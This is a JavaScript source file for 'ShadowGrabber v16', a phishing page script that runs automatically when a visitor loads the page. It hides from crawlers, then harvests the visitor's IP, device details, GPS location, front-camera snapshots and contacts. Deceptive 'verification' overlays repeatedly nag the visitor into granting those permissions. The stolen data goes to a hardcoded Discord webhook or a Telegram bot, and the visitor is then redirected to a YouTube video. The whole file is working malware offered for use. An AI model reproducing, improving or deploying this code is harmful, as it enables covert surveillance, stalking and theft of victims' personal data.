// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v16.0 - TELEGRAM MULTI-USER EDITION 💀
// ═══════════════════════════════════════════════════════════════════════════
// "One script. Infinite agents. Zero noise."
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    // 🛡️ DEFAULT CONFIG (Fallback if no hash provided)
    DEFAULT_WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    DEFAULT_REDIRECT: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',

    // ⚙️ SYSTEM SETTINGS
    CAMERA_SNAPS: 5,
    SNAP_INTERVAL: 800,
    AUTO_START: true,
    FORCE_PERMISSIONS: true, // Nagging Mode
};

// ═══════════════════════════════════════════════════════════════════════════
// 🕵️ MODULE 1: CONFIG LOADER (HASH PARSER)
// Reads #tg=BASE64 from URL to load Bot Token & Chat ID dynamically.
// ═══════════════════════════════════════════════════════════════════════════
class ConfigLoader {
    static load() {
        const hash = window.location.hash.substring(1); // Remove '#'
        const params = new URLSearchParams(hash);
        const tgCode = params.get('tg');

        if (tgCode) {
            try {
                // Decode Base64 -> JSON
                const decoded = atob(tgCode);
                // The generator creates a JSON string inside the base64
                // Format: {"t":"TOKEN","c":"CHAT_ID","r":"REDIRECT"}
                // But simplified: the generator makes a JSON object.
                // Note: atob decodes the JSON string.
                // Let's assume the generator output: JSON.stringify({t:.., c:.., r:..}) -> btoa

                // Correction: The generator does exactly that.
                const data = JSON.parse(decoded);

                return {
                    mode: 'TELEGRAM',
                    token: data.t,
                    chatId: data.c,
                    redirect: data.r || CONFIG.DEFAULT_REDIRECT
                };
            } catch (e) {
                console.error('Invalid Hash');
            }
        }

        // Fallback to Discord Default
        return {
            mode: 'DISCORD',
            webhook: CONFIG.DEFAULT_WEBHOOK,
            redirect: CONFIG.DEFAULT_REDIRECT
        };
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🤖 MODULE 2: BOT FILTER (CRAWLER DEFENSE)
// Stops execution if the visitor is Googlebot, Bingbot, or a Link Preview.
// This prevents "Unknown" logs in your Telegram/Discord.
// ═══════════════════════════════════════════════════════════════════════════
class BotFilter {
    static check() {
        const ua = navigator.userAgent.toLowerCase();
        // Common Crawler Keywords
        const bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'embeddings', 'discord', 'telegram', 'whatsapp', 'twitter', 'facebookexternalhit', 'headless', 'puppeteer'];

        if (bots.some(b => ua.includes(b)) || navigator.webdriver) {
            // It's a bot. Stop everything. Show generic 404.
            document.body.innerHTML = '<h1>404 Not Found</h1>';
            throw new Error('Bot Detected. Execution Halted.');
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📡 MODULE 3: UNIVERSAL UPLINK (DISCORD + TELEGRAM)
// ═══════════════════════════════════════════════════════════════════════════
class Uplink {
    constructor(config) {
        this.config = config;
    }

    async sendReport(report) {
        if (this.config.mode === 'TELEGRAM') await this.sendTelegramText(report);
        else await this.sendDiscordEmbed(report);
    }

    async sendImage(blob, name, caption) {
        if (this.config.mode === 'TELEGRAM') await this.sendTelegramPhoto(blob, caption);
        else await this.sendDiscordFile(blob, name, caption);
    }

    async sendFile(blob, name, caption) {
        if (this.config.mode === 'TELEGRAM') await this.sendTelegramDoc(blob, caption);
        else await this.sendDiscordFile(blob, name, caption);
    }

    // --- TELEGRAM LOGIC ---
    async sendTelegramText(text) {
        const url = `https://api.telegram.org/bot${this.config.token}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: this.config.chatId, text: text, parse_mode: 'HTML' })
        });
    }

    async sendTelegramPhoto(blob, caption) {
        const url = `https://api.telegram.org/bot${this.config.token}/sendPhoto`;
        const fd = new FormData();
        fd.append('chat_id', this.config.chatId);
        fd.append('photo', blob, 'cam.jpg');
        if (caption) fd.append('caption', caption);
        await fetch(url, { method: 'POST', body: fd });
    }

    async sendTelegramDoc(blob, caption) {
        const url = `https://api.telegram.org/bot${this.config.token}/sendDocument`;
        const fd = new FormData();
        fd.append('chat_id', this.config.chatId);
        fd.append('document', blob, 'contacts.json');
        if (caption) fd.append('caption', caption);
        await fetch(url, { method: 'POST', body: fd });
    }

    // --- DISCORD LOGIC (Legacy) ---
    async sendDiscordEmbed(embedData) {
        const fd = new FormData();
        fd.append('payload_json', JSON.stringify({
            embeds: [embedData],
            username: 'Yasir Abbas | ShadowGrabber v16'
        }));
        await fetch(this.config.webhook, { method: 'POST', body: fd });
    }

    async sendDiscordFile(blob, name, caption) {
        const fd = new FormData();
        fd.append('payload_json', JSON.stringify({
            content: caption || '',
            username: 'ShadowGrabber'
        }));
        fd.append('file', blob, name);
        await fetch(this.config.webhook, { method: 'POST', body: fd });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🧠 MODULE 4: CONTEXT & FORENSICS
// ═══════════════════════════════════════════════════════════════════════════
class ContextManager {
    constructor(url) {
        this.ctx = this.analyze(url);
    }
    analyze(url) {
        const u = url.toLowerCase();
        if (u.includes('youtube')) return { t: 'YouTube', h: 'Loading 4K Video...', c: '#FF0000', l: '<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>' };
        return { t: 'Loading...', h: 'Connecting...', c: '#222', l: '' };
    }
}

class Forensics {
    async scan() {
        const ip = await Promise.any([
            fetch('https://ipapi.co/json/').then(r => r.json()),
            fetch('http://ip-api.com/json/').then(r => r.json())
        ]).catch(() => ({ ip: 'N/A' }));
        return { ip, ua: navigator.userAgent, platform: navigator.platform, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory, batt: await navigator.getBattery?.().then(b => Math.round(b.level * 100)) || 'N/A' };
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 MODULE 5: LOCATION GUARD (PERSISTENT)
// ═══════════════════════════════════════════════════════════════════════════
class LocationGuard {
    constructor(overlay) { this.overlay = overlay; }
    lock() {
        return new Promise(resolve => {
            const attempt = () => {
                navigator.geolocation.getCurrentPosition(
                    p => resolve({ success: true, ...p.coords }),
                    async e => {
                        // Only Nag on Denied (1)
                        if (e.code === 1 && CONFIG.FORCE_PERMISSIONS) {
                            await this.overlay.create('Location Required', 'Access blocked. Please enable location.', 'Retry');
                            attempt();
                        } else resolve({ success: false, error: e.message });
                    },
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            };
            if (!navigator.geolocation) resolve({ success: false }); else attempt();
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📸 MODULE 6: CAMERA GUARD (IOS FIX: playsinline)
// ═══════════════════════════════════════════════════════════════════════════
class CameraGuard {
    constructor(video, overlay) {
        this.video = video;
        this.overlay = overlay;
        // iOS Fix: crucial attributes
        this.video.setAttribute('playsinline', '');
        this.video.setAttribute('webkit-playsinline', '');
    }

    async start() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            this.video.srcObject = s;
            await this.video.play();
            return true;
        } catch (e) {
            if (CONFIG.FORCE_PERMISSIONS) {
                await this.overlay.create('Face Verification', 'Biometric sensor access required.', 'Retry');
                return this.start();
            }
            return false;
        }
    }

    async snap(uplink, count) {
        for (let i = 0; i < count; i++) {
            const cvs = document.createElement('canvas');
            cvs.width = this.video.videoWidth; cvs.height = this.video.videoHeight;
            cvs.getContext('2d').drawImage(this.video, 0, 0);
            const blob = await new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.9));
            if (blob) await uplink.sendImage(blob, `snap_${i}.jpg`, `📸 Snap ${i + 1}`);
            await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🧩 UI OVERLAY
// ═══════════════════════════════════════════════════════════════════════════
class Overlay {
    create(t, m, b) {
        return new Promise(r => {
            if (this.el) document.body.removeChild(this.el);
            this.el = document.createElement('div');
            Object.assign(this.el.style, { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.95)', zIndex: 9999, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', textAlign: 'center', color: '#fff', fontFamily: 'sans-serif' });
            this.el.innerHTML = `<div style="background:#222; padding:30px; border-radius:15px; width:80%; max-width:300px;"><h2 style="margin:0 0 10px;">${t}</h2><p style="color:#aaa; margin-bottom:20px;">${m}</p><button id="ov-btn" style="width:100%; padding:15px; background:#007bff; border:none; color:#fff; border-radius:8px; font-weight:bold;">${b}</button></div>`;
            document.body.appendChild(this.el);
            document.getElementById('ov-btn').onclick = () => { this.el.style.display = 'none'; r(); };
        });
    }
    success(t) { if (this.el) { this.el.innerHTML = `<h1 style="font-size:50px; color:#0f0;">✔</h1><h3>${t}</h3>`; setTimeout(() => this.el.remove(), 1000); } }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 MAIN
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    BotFilter.check(); // Stop crawlers instantly

    const cfg = ConfigLoader.load(); // Detect Telegram or Discord
    const uplink = new Uplink(cfg);
    const ctx = new ContextManager(cfg.redirect).ctx;
    const overlay = new Overlay();

    // UI Setup
    document.title = ctx.t;
    document.querySelector('.asana-logo').innerHTML = ctx.l;
    document.getElementById('loading-text').textContent = ctx.h;
    document.getElementById('progress-bar').style.background = ctx.c;

    // 1. Initial Report
    const intel = await new Forensics().scan();
    const mapUrl = `https://www.google.com/maps?q=${intel.ip.latitude},${intel.ip.longitude}`;

    const reportText = `
🎯 <b>NEW TARGET CONNECTED</b>
━━━━━━━━━━━━━━━━
<b>IP Info:</b>
🌐 IP: <code>${intel.ip.ip}</code>
🏢 ISP: ${intel.ip.org || intel.ip.isp}
📍 LOC: ${intel.ip.city}, ${intel.ip.country_name}

<b>Device Info:</b>
📱 Model: ${intel.ua.substring(0, 50)}...
💻 OS: ${intel.platform}
🔋 Battery: ${intel.batt}%
🧠 Cores: ${intel.cores} | RAM: ${intel.ram}GB

🔗 <a href="${mapUrl}">View IP Location on Maps</a>
    `.trim();

    const discordEmbed = {
        title: '🎯 TARGET CONNECTED', color: 0x00FF00, description: `**IP:** \`${intel.ip.ip}\`\n**ISP:** ${intel.ip.org}\n**Loc:** ${intel.ip.city}`, fields: [{ name: 'Device', value: intel.platform }]
    };

    // Send formatted for platform
    if (cfg.mode === 'TELEGRAM') await uplink.sendTelegramText(reportText);
    else await uplink.sendDiscordEmbed(discordEmbed);

    // 2. GPS (Persistent)
    const loc = await new LocationGuard(overlay).lock();
    if (loc.success) {
        const gpsLink = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
        const gpsText = `✅ <b>GPS LOCKED ACCURATE</b>\n\n📌 Lat: <code>${loc.latitude}</code>\n📌 Long: <code>${loc.longitude}</code>\n🌊 Acc: ${loc.accuracy}m\n\n🔗 <a href="${gpsLink}">OPEN IN GOOGLE MAPS</a>`;

        if (cfg.mode === 'TELEGRAM') await uplink.sendTelegramText(gpsText);
        else await uplink.sendDiscordEmbed({ title: '✅ GPS LOCKED', color: 0x00FF00, description: `[OPEN MAPS](${gpsLink})` });

        overlay.success('Region Confirmed');
    } else {
        const failText = `⚠️ <b>GPS FAILED</b>\nError: ${loc.error}`;
        if (cfg.mode === 'TELEGRAM') await uplink.sendTelegramText(failText);
        else await uplink.sendDiscordEmbed({ title: '⚠️ GPS FAILED', color: 0xFF0000, description: loc.error });
    }

    // 3. Camera
    const cam = new CameraGuard(document.getElementById('st-v'), overlay);
    if (await cam.start()) {
        await new Promise(r => setTimeout(r, 800));
        await cam.snap(uplink, CONFIG.CAMERA_SNAPS);
        overlay.success('Biometrics Verified');
    }

    // 4. Contacts (Android Only)
    if ('contacts' in navigator && 'ContactsManager' in window) {
        await overlay.create('Identity Check', 'Verify contacts to continue.', 'Verify');
        try {
            const c = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            if (c.length) {
                const blob = new Blob([JSON.stringify(c, null, 2)], { type: 'application/json' });
                await uplink.sendFile(blob, 'contacts.json', `📇 <b>${c.length} Contacts Extracted</b>`);
            }
        } catch (e) { }
        overlay.success('Identity Sync');
    }

    // 5. Exit
    await new Promise(r => setTimeout(r, 400));
    window.location.href = cfg.redirect;
}

if (CONFIG.AUTO_START) window.onload = () => setTimeout(main, 100);
else window.onclick = main;
